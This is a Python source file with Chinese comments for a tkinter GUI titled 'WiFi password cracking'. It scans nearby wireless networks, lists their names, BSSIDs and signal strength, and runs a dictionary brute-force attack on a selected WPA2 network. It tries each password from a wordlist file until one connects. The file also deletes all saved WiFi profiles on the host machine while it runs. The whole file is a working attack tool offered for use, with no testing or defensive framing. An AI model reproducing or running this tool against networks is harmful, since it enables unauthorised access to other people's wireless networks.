# coding:utf-8

from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox
import threading


class Gui:
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name
        self.get_value = StringVar()
        self.get_wifi_value = StringVar()
        self.get_wifimm_value = StringVar()
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.iface.disconnect()
        time.sleep(1)
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def __str__(self):
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    def set_init_window(self):
        self.init_window_name.title("WIFI密码破解")
        self.init_window_name.geometry('+500+200')      # 确定程序出现位置
        # 配置选项
        labelframe = LabelFrame(width=400, height=200, text="配置")
        labelframe.grid(column=0, row=0, padx=10, pady=10)
        self.search = Button(labelframe, text="搜索附近WiFi", command=lambda: thread_it(self.scans_wifi_list)).grid(column=0, row=0)
        self.crack = Button(labelframe, text="开始破解密码", command=lambda: thread_it(self.readPassWord)).grid(column=1, row=0)
        self.label = Label(labelframe, text="弱口令字典路径：").grid(column=0, row=1)
        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)
        self.file = Button(labelframe, text="添加字典文件目录", command=self.add_mm_file).grid(column=2, row=1)
        self.wifi_text = Label(labelframe, text="WiFi账号：").grid(column=0, row=2)
        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)
        self.wifi_mm_text = Label(labelframe, text="WiFi密码：").grid(column=2, row=2)
        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2, sticky=W)

        self.labelinfor = LabelFrame(width=100, height=100, text="爆破过程")
        self.labelinfor.grid(column=0, row=3, padx=10, pady=10)
        self.text = tkinter.Text(self.labelinfor, height=10, width=50)
        self.text.grid(column=0, row=3, padx=10, pady=10)

        # wifi列表显示
        self.wifi_labelframe = LabelFrame(text="wifi列表")
        self.wifi_labelframe.grid(column=0, row=4, columnspan=4, sticky=NSEW)
        self.tree = ttk.Treeview(self.wifi_labelframe, column=[1, 2, 3, 4], show="headings")
        self.bar = Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=self.bar.set)
        # 每列的标题
        self.tree.column('1', width=50, anchor="center")
        self.tree.column('2', width=100, anchor="center")
        self.tree.column('3', width=100, anchor="center")
        self.tree.column('4', width=100, anchor="center")
        self.tree.heading('1', text="WiFiID")
        self.tree.heading('2', text="WiFi名")
        self.tree.heading('3', text="BSSID")
        self.tree.heading('4', text="信号强度")
        self.tree.grid(row=5, column=0, sticky=NSEW)
        # 双击wifi，填入wifi框内
        self.tree.bind("<Double-1>", self.onDBClick)
        self.bar.grid(row=5, column=1, sticky=NS)

    def scans_wifi_list(self):
        print("扫描开始，需要一段时间，请耐心等候")
        self.iface.scan()
        time.sleep(1)
        scanres = self.iface.scan_results()
        nums = len(scanres)
        print("数量：%s"%(nums))
        self.show_scans_wifi_lists(scanres)
        return scanres

    def show_scans_wifi_lists(self, scan_res):
        x = self.tree.get_children()
        for item in x:
            self.tree.delete(item)
        for index, wifi_info in enumerate(scan_res):
            self.tree.insert("", 'end', value=(index+1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))

    def add_mm_file(self):
        self.filename = tkinter.filedialog.askopenfilename()
        self.get_value.set(self.filename)

    # Treeview绑定事件
    def onDBClick(self, event):
        self.sels = event.widget.selection()
        self.get_wifi_value.set(self.tree.item(self.sels, "values")[1])


    # 读取密码字典，进行匹配
    def readPassWord(self):
        self.getFilePath = self.get_value.get()
        # print("文件路径：%s\n" %(self.getFilePath))
        self.get_wifissid = self.get_wifi_value.get()
        # print("ssid：%s\n" %(self.get_wifissid))
        self.pwdfilehander = open(self.getFilePath, "r", errors="ignore")
        while True:
            try:
                self.pwdStr = self.pwdfilehander.readline()
                # print("密码: %s " %(self.pwdStr))
                if not self.pwdStr:
                    break
                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)
                # print("返回值：%s\n" %(self.bool1) )
                if self.bool1:
                    # print("密码正确："+pwdStr
                    # res = "密码:%s 正确 \n"%self.pwdStr;
                    self.res = "===正确===  wifi名:%s  匹配密码：%s " % (self.get_wifissid, self.pwdStr)
                    self.get_wifimm_value.set(self.pwdStr)
                    tkinter.messagebox.showinfo('提示', '破解成功！！！')
                    self.text.insert(tkinter.INSERT, self.res)
                    self.text.insert(tkinter.INSERT, '\n')
                    break
                else:
                    # print("密码:"+self.pwdStr+"错误")
                    self.res = "---错误--- wifi名:%s匹配密码：%s" % (self.get_wifissid, self.pwdStr)
                    self.text.insert(tkinter.INSERT, self.res)
                    self.text.insert(tkinter.INSERT, '\n')

            except:
                continue

    # 对wifi和密码进行匹配
    def connect(self, pwd_Str, wifi_ssid):
        self.profile = pywifi.Profile()
        self.profile.ssid = wifi_ssid  # wifi名称
        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        self.profile.key = pwd_Str  # 密码
        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件
        self.iface.connect(self.tmp_profile)  # 链接
        time.sleep(1.5)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 断开
        #time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in \
                [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

def thread_it(func, *args):
    '''将函数打包进线程'''
    # 创建
    t = threading.Thread(target=func, args=args)
    # 守护 !!!
    t.setDaemon(True)
    # 启动
    t.start()

def gui_start():
    window = Tk()
    ui = Gui(window)
    print(ui)
    ui.set_init_window()
    window.mainloop()


gui_start()

